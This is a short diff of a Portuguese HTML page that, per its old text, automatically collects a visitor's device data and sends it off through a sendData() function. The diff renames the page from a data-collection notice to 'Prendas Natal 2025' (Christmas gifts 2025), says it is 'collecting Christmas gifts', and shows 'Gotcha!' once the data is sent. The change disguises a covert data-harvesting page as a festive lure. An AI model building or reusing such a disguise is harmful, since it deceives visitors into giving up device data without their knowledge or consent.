@@ -2,7 +2,7 @@
 <html lang="pt">
 <head>
 <meta charset="UTF-8" />
-<title>Coleta de Dados Técnicos</title>
+<title>Prendas Natal 2025</title>
 <style>
   body {
     font-family: Arial, sans-serif;
@@ -23,8 +23,8 @@
 
 <body>
 <div class="box">
-  <h2>Coleta Automática de Dados Técnicos</h2>
-  <p id="status">A recolher dados do seu dispositivo...</p>
+  <h2>Prendas Natal 2025</h2>
+  <p id="status">A recolher prendas de Natal...</p>
 </div>
 
 <script>
@@ -54,10 +54,10 @@ async function sendData() {
 
     const resultText = await response.text();
     console.log(resultText);
-    status.innerText = "Dados enviados com sucesso!";
+    status.innerText = "Gotcha!";
   } catch (error) {
     console.error(error);
-    status.innerText = "Erro ao enviar dados.";
+    status.innerText = "Error.";
   }
 }
 
